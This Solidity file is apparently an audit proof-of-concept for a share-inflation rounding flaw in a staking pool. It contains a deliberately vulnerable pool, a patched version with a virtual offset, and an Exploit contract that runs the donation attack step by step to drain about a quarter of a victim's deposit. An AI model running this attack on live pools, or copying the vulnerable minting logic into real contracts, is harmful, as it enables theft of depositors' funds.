// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Zealous ZEALInfinityPool (Hexens, May 2025).
    stake() mints xZeal = amount * PRECISION / exchangeRate, rounding down.
    A first depositor leaves 1 share against 1 wei, donates rewards, and the
    next stake rounds to 1 share. Redeeming the attacker's share takes half
    the pool. With X = 1000e18 the donation is X/2 and the profit is X/4 - 1.
*/

contract ZealToken {
    string public symbol = "ZEAL";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract ZealPool {
    uint256 public constant PRECISION = 1e18;
    ZealToken public immutable token;
    uint256 public totalStaked;
    uint256 public totalRewards;
    uint256 public totalShares;
    mapping(address => uint256) public shares;

    constructor(ZealToken _token) {
        token = _token;
    }

    function stake(uint256 amount) external returns (uint256 xMint) {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 xSupply = totalShares;
        if (xSupply == 0) {
            xMint = amount;
        } else {
            uint256 currentRate = (totalStaked + totalRewards) * PRECISION / xSupply;
            // @> VULN: xMint rounds down, so an inflated rate mints 1 share for a full deposit
            xMint = amount * PRECISION / currentRate;
        }
        require(xMint > 0, "Stake amount too small");
        totalStaked += amount;
        shares[msg.sender] += xMint;
        totalShares += xMint;
    }

    function addRewards(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        totalRewards += amount;
    }

    function unstake(uint256 xAmount) external returns (uint256 assets) {
        uint256 backing = totalStaked + totalRewards;
        assets = backing * xAmount / totalShares;
        shares[msg.sender] -= xAmount;
        totalShares -= xAmount;
        if (assets <= totalRewards) {
            totalRewards -= assets;
        } else {
            uint256 rest = assets - totalRewards;
            totalRewards = 0;
            totalStaked -= rest;
        }
        token.transfer(msg.sender, assets);
    }
}

contract ZealPoolFixed {
    uint256 public constant PRECISION = 1e18;
    uint256 public constant OFFSET = 1_000;
    ZealToken public immutable token;
    uint256 public totalStaked;
    uint256 public totalRewards;
    uint256 public totalShares;
    mapping(address => uint256) public shares;

    constructor(ZealToken _token) {
        token = _token;
    }

    function stake(uint256 amount) external returns (uint256 xMint) {
        token.transferFrom(msg.sender, address(this), amount);
        uint256 backing = totalStaked + totalRewards;
        uint256 currentRate = (backing + OFFSET) * PRECISION / (totalShares + OFFSET);
        xMint = amount * PRECISION / currentRate;
        require(xMint > 0, "Stake amount too small");
        uint256 credited = xMint * currentRate / PRECISION;
        require(credited + 1 >= amount, "inflation");
        totalStaked += amount;
        shares[msg.sender] += xMint;
        totalShares += xMint;
    }

    function addRewards(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
        totalRewards += amount;
    }

    function unstake(uint256 xAmount) external returns (uint256 assets) {
        uint256 backing = totalStaked + totalRewards;
        assets = (backing + OFFSET) * xAmount / (totalShares + OFFSET);
        shares[msg.sender] -= xAmount;
        totalShares -= xAmount;
        if (assets <= totalRewards) {
            totalRewards -= assets;
        } else {
            uint256 rest = assets - totalRewards;
            totalRewards = 0;
            totalStaked -= rest;
        }
        token.transfer(msg.sender, assets);
    }
}

contract ZealVictim {
    ZealToken public immutable token;
    ZealPool public immutable pool;

    constructor(ZealToken _token, ZealPool _pool) {
        token = _token;
        pool = _pool;
    }

    function deposit(uint256 amount) external {
        token.approve(address(pool), amount);
        pool.stake(amount);
    }
}

contract ZealVictimFixed {
    ZealToken public immutable token;
    ZealPoolFixed public immutable pool;

    constructor(ZealToken _token, ZealPoolFixed _pool) {
        token = _token;
        pool = _pool;
    }

    function deposit(uint256 amount) external {
        token.approve(address(pool), amount);
        pool.stake(amount);
    }
}

contract Exploit {
    uint256 public constant X = 1_000e18;
    ZealToken public token;
    ZealPool public pool;
    ZealVictim public victim;

    constructor() {
        token = new ZealToken();
        pool = new ZealPool(token);
        victim = new ZealVictim(token, pool);
        token.mint(address(this), 1e18 + X / 2);
        token.mint(address(victim), X);
    }

    function run() external {
        token.approve(address(pool), type(uint256).max);
        pool.stake(1e18);
        pool.unstake(1e18 - 1);
        require(pool.totalShares() == 1, "one share left");
        require(pool.totalStaked() == 1, "one wei staked");
        pool.addRewards(X / 2);
        uint256 rate = (pool.totalStaked() + pool.totalRewards()) * pool.PRECISION() / pool.totalShares();
        require(rate == (1 + X / 2) * 1e18, "rate spiked");
        victim.deposit(X);
        uint256 victimShares = pool.shares(address(victim));
        require(victimShares == 1, "victim minted 1");
        uint256 beforeRedeem = token.balanceOf(address(this));
        uint256 redeemed = pool.unstake(1);
        require(redeemed == 750e18, "redeemed half");
        uint256 endBal = token.balanceOf(address(this));
        require(endBal == beforeRedeem + 750e18, "payout");
        require(endBal == 751e18 - 1, "end balance");
        require(endBal == (1e18 + X / 2) + (X / 4 - 1), "profit X/4 - 1");
    }
}
